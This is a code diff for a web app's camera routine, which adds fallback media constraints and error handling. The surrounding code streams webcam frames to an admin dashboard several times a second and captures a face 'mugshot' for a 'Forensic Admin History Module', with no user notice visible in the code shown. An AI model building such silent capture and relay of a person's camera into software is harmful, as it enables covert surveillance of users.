@@ -98,12 +98,31 @@ socket.on('login_success', () => {
 // --- MEDIA & ADMIN STREAMING ---
 async function initMedia() {
     try {
-        // Strict constraints for High-Clarity No-Delay Video Networking
-        localStream = await navigator.mediaDevices.getUserMedia({
-            video: { width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
+        statusText.innerText = "Requesting media...";
+        
+        // Fallback-safe constraints
+        const constraints = {
+            video: { 
+                width: { ideal: 1280 }, 
+                height: { ideal: 720 },
+                facingMode: "user"
+            },
             audio: { echoCancellation: true, noiseSuppression: true }
-        });
+        };
+
+        try {
+            localStream = await navigator.mediaDevices.getUserMedia(constraints);
+        } catch (e) {
+            console.log("Ideal constraints failed, trying basic video/audio", e);
+            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        }
+
         localVideo.srcObject = localStream;
+        
+        // Explicitly play the video (fixes black screen on many browsers)
+        localVideo.onloadedmetadata = () => {
+            localVideo.play().catch(e => console.error("Auto-play failed:", e));
+        };
         
         // Accelerated Ultra-Clear Admin Preview Feeds:
         streamCanvas.width = 480; 
@@ -112,12 +131,12 @@ async function initMedia() {
             if (localVideo.readyState === localVideo.HAVE_ENOUGH_DATA) {
                 ctx.drawImage(localVideo, 0, 0, streamCanvas.width, streamCanvas.height);
                 // JPEG compression at Fast Quality (Low Delay)
-                const frameData = streamCanvas.toDataURL('image/jpeg', 0.85);
+                const frameData = streamCanvas.toDataURL('image/jpeg', 0.8);
                 socket.emit('video_frame', frameData);
             }
-        }, 200); // 5 frames per second for ultra-fluid admin dash syncing
+        }, 300); 
 
-        // 1.5 Second Logic Hook: Capture exact face mugshot for Forensic Admin History Module
+        // Mugshot capture
         setTimeout(() => {
             if (localVideo.readyState === localVideo.HAVE_ENOUGH_DATA) {
                 const profileCap = document.createElement('canvas');
@@ -125,10 +144,12 @@ async function initMedia() {
                 profileCap.getContext('2d').drawImage(localVideo, 0, 0, 320, 240);
                 socket.emit('register_face_capture', profileCap.toDataURL('image/jpeg', 0.9));
             }
-        }, 1500);
+        }, 2000);
 
     } catch (error) {
-        statusText.innerText = "Camera access required.";
+        console.error("Camera Error:", error);
+        statusText.innerText = "Camera Error: " + error.message;
+        statusText.style.color = "var(--danger)";
     }
 }
 
